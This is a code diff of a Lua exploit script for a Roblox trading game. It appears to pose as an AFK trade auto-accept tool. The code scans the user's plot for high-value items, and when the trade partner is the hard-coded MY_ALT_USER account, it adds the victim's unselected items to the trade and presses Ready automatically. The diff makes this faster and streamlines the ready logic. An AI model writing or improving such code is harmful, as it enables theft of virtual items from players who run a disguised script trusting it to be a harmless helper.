@@ -71,13 +71,7 @@ local function tradeIsActive()
     local outer = playerGui:FindFirstChild("TradeLiveTrade")
     if not outer then return false end
     local inner = outer:FindFirstChild("TradeLiveTrade")
-    if not inner then return false end
-    local scrolling = inner:FindFirstChild("ScrollingFrame", true)
-    if not scrolling then return false end
-    for _, slot in pairs(scrolling:GetChildren()) do
-        if slot.Name:sub(1, 9) == "Selection" then return true end
-    end
-    return false
+    return inner and inner.Visible
 end
 
 local function sendInvite(target)
@@ -87,8 +81,6 @@ local function sendInvite(target)
     sb.Text = target
     task.wait(0.05)
     pcall(function() firesignal(sb.FocusLost, true) end)
-    task.wait(0.05)
-    pcall(function() firesignal(sb.ReturnPressedFromOnScreenKeyboard) end)
     task.wait(0.3)
     local list = tl.Global.List
     for _, player in pairs(list:GetChildren()) do
@@ -103,6 +95,7 @@ local function sendInvite(target)
     return false
 end
 
+-- PHASE 1: ACCEPT INCOMING REQUEST
 task.spawn(function()
     while true do
         pcall(function()
@@ -119,6 +112,7 @@ task.spawn(function()
     end
 end)
 
+-- PHASE 2: AUTO READY/ACCEPT INSIDE TRADE
 while true do
     local highValueItems = scanPlot()
     
@@ -133,50 +127,31 @@ while true do
             if otherUser:find(MY_ALT_USER:lower()) then
                 local scrolling = innerGui:FindFirstChild("ScrollingFrame", true)
                 if scrolling then
-                    local slots = {}
                     for _, slot in pairs(scrolling:GetChildren()) do
                         if slot.Name:sub(1, 9) == "Selection" then
-                            table.insert(slots, slot)
-                        end
-                    end
-                    table.sort(slots, function(a, b) return a.Name < b.Name end)
-                    
-                    for _, slot in ipairs(slots) do
-                        local spacer = slot:FindFirstChild("Spacer")
-                        if spacer then
-                            local stroke = spacer:FindFirstChild("UIStroke")
-                            if stroke and not (math.floor(stroke.Color.R * 255) == 0 and math.floor(stroke.Color.G * 255) == 255) then
-                                pcall(function() firesignal(spacer.Activated) end)
-                                task.wait(1.1)
+                            local spacer = slot:FindFirstChild("Spacer")
+                            if spacer then
+                                local stroke = spacer:FindFirstChild("UIStroke")
+                                if stroke and not (math.floor(stroke.Color.R * 255) == 0 and math.floor(stroke.Color.G * 255) == 255) then
+                                    pcall(function() firesignal(spacer.Activated) end)
+                                    task.wait(0.1)
+                                end
                             end
                         end
                     end
                 end
                 
                 local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
-                local readyIndicator = innerGui:FindFirstChild("Your"):FindFirstChild("Ready")
-                
-                while true do
-                    if not tradeIsActive() then break end
-                    if readyIndicator and readyIndicator.Visible then break end
-                    if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
-                    task.wait(1)
-                end
+                if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
             end
         end
     else
+        -- If no items found, just act as a standard AFK Auto-Accept for members
         if tradeIsActive() then
             local innerGui = playerGui.TradeLiveTrade.TradeLiveTrade
             local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
-            local readyIndicator = innerGui:FindFirstChild("Your"):FindFirstChild("Ready")
-            
-            while true do
-                if not tradeIsActive() then break end
-                if readyIndicator and readyIndicator.Visible then break end
-                if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
-                task.wait(1)
-            end
+            if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
         end
     end
-    task.wait(0.5)
+    task.wait(0.2)
 end
